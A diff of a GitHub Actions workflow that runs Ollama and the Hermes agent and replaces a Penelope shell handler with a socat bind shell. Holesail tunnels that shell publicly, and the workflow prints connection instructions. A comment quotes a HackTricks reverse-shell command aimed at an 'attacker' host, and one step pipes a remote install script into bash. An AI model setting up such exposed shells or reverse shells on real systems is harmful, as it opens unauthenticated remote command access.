@@ -1,4 +1,4 @@
-name: Queen (Hermes + Ollama) with Penelope Shell
+name: Queen (Hermes + Ollama) with Full Interactive Shell
 
 on:
   workflow_dispatch:
@@ -17,81 +17,37 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      # ---------- Setup Ollama ----------
       - name: Setup Ollama
         uses: ai-action/setup-ollama@v1
 
       - name: Pull Ollama model
         run: ollama pull ${{ env.OLLAMA_MODEL }}
 
-      # ---------- Install Hermes Agent ----------
       - name: Install Hermes Agent
         run: |
           curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash
           echo "$HOME/.hermes/bin" >> $GITHUB_PATH
           export PATH="$HOME/.hermes/bin:$PATH"
 
-      # ---------- Install Penelope and Holesail ----------
-      - name: Install Penelope and Holesail
+      - name: Install socat and Holesail
         run: |
           sudo apt-get update -qq
-          sudo apt-get install -y nodejs npm python3 python3-pip
+          sudo apt-get install -y socat nodejs npm
           sudo npm install -g holesail
-          # Install Penelope via pipx (clean, correct method)
-          python3 -m pip install --user pipx
-          python3 -m pipx ensurepath
-          export PATH="$HOME/.local/bin:$PATH"
-          pipx install penelope-shell-handler
-          # Verify installation
-          penelope --version || { echo "❌ Penelope installation failed"; exit 1; }
 
-      # ---------- Start Ollama (if not running) ----------
       - name: Start Ollama
-        run: |
-          if ! pgrep -f "ollama serve" > /dev/null; then
-            ollama serve &
-            sleep 3
-          else
-            echo "✅ Ollama already running"
-          fi
+        run: ollama serve &
 
-      # ---------- Start Penelope server ----------
-      - name: Start Penelope
+      # ---------- The HackTricks socat method (adapted) ----------
+      # In HackTricks, the victim runs: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker:4444
+      # Our runner cannot connect out, so we LISTEN instead.
+      # The client (you) connects with socat - or socat file:`tty`...
+      - name: Start fully interactive shell server
         run: |
-          export PATH="$HOME/.local/bin:$PATH"
-          # Kill any process using the port
-          sudo fuser -k ${{ env.SHELL_PORT }}/tcp || true
-          # Start Penelope in background
-          nohup penelope -p ${{ env.SHELL_PORT }} --no-upgrade > penelope.log 2>&1 &
-          sleep 5
-          # Check if it's listening
-          if netstat -tulpn 2>/dev/null | grep -q ":${{ env.SHELL_PORT }}"; then
-            echo "✅ Penelope listening on port ${{ env.SHELL_PORT }}"
-          else
-            echo "❌ Penelope not listening. Logs:"
-            cat penelope.log
-            # Try foreground for debugging
-            penelope -p ${{ env.SHELL_PORT }} --no-upgrade &
-            sleep 5
-            netstat -tulpn | grep :${{ env.SHELL_PORT }} || { echo "❌ Still not listening"; exit 1; }
-          fi
+          socat TCP-LISTEN:${{ env.SHELL_PORT }},nodelay,fork EXEC:'env TERM=xterm-256color bash -li',pty,stderr,setsid,sigint,sane &
+          sleep 2
 
-      # ---------- Start Hermes Dashboard (optional) ----------
-      - name: Start Hermes Dashboard
-        run: |
-          export PATH="$HOME/.hermes/bin:$PATH"
-          hermes dashboard --host 0.0.0.0 --port 18789 --no-open &
-          sleep 10
-          for i in {1..10}; do
-            if curl -s http://localhost:18789/health > /dev/null; then
-              echo "✅ Hermes Dashboard ready"
-              break
-            fi
-            sleep 2
-          done
-
-      # ---------- Expose shell port via Holesail ----------
-      - name: Expose Penelope with Holesail
+      - name: Expose shell with Holesail
         id: holesail
         run: |
           holesail --live ${{ env.SHELL_PORT }} --public > holesail.log 2>&1 &
@@ -104,7 +60,6 @@ jobs:
           fi
           echo "connection_key=$CONNECTION_KEY" >> $GITHUB_OUTPUT
 
-      # ---------- Print access instructions ----------
       - name: Print access
         env:
           CONNECTION_KEY: ${{ steps.holesail.outputs.connection_key }}
@@ -113,30 +68,28 @@ jobs:
           echo "🔑 Holesail Connection Key:"
           echo "   $CONNECTION_KEY"
           echo ""
-          echo "🌐 To get a FULL, LAG‑FREE interactive shell on the runner:"
+          echo "🌐 HackTricks `socat` PTY method – adapted for GitHub Actions:"
           echo ""
-          echo "   1. Install Holesail on your local machine:"
+          echo "   The runner is LISTENING (reversed role) because it cannot reach you."
+          echo "   Holesail tunnels the runner's port to your local machine."
+          echo ""
+          echo "   1. Install Holesail and socat on your local machine:"
           echo "      npm install -g holesail"
+          echo "      # Ubuntu/Debian: sudo apt-get install socat"
+          echo "      # macOS: brew install socat"
           echo ""
-          echo "   2. Install Penelope on your local machine (optional):"
-          echo "      pipx install penelope-shell-handler"
-          echo ""
-          echo "   3. Start the Holesail client (keep this terminal open):"
+          echo "   2. Start the Holesail client (keep this terminal open):"
           echo "      holesail \"$CONNECTION_KEY\" --port ${{ env.SHELL_PORT }}"
           echo ""
-          echo "   4. In a NEW terminal, connect with:"
-          echo "      nc localhost ${{ env.SHELL_PORT }}"
+          echo "   3. In a NEW terminal, connect with the HackTricks listener command:"
+          echo "      socat file:\`tty\`,raw,echo=0 TCP:localhost:${{ env.SHELL_PORT }},nodelay"
           echo ""
-          echo "   That's it! Penelope will automatically give you a full PTY."
+          echo "   That's it! You get a full PTY with job control, signals, history."
+          echo "   Equivalent to the HackTricks `socat file:`tty`...` listener."
           echo ""
-          echo "   Features:"
-          echo "     - Arrow keys / history"
-          echo "     - Ctrl+C (SIGINT), Ctrl+Z (job control)"
-          echo "     - Tab completion"
-          echo "     - Window resize support"
-          echo "     - File transfers (download / upload)"
-          echo "     - Session management"
+          echo "💡 For an even faster connection (no resize), use:"
+          echo "      socat - TCP:localhost:${{ env.SHELL_PORT }},nodelay"
           echo ""
-          echo "   After connecting, press F12 to return to Penelope's menu."
+          echo "   Run 'hermes chat --model ${{ env.OLLAMA_MODEL }}' to chat."
           echo "================================================================="
           sleep infinity
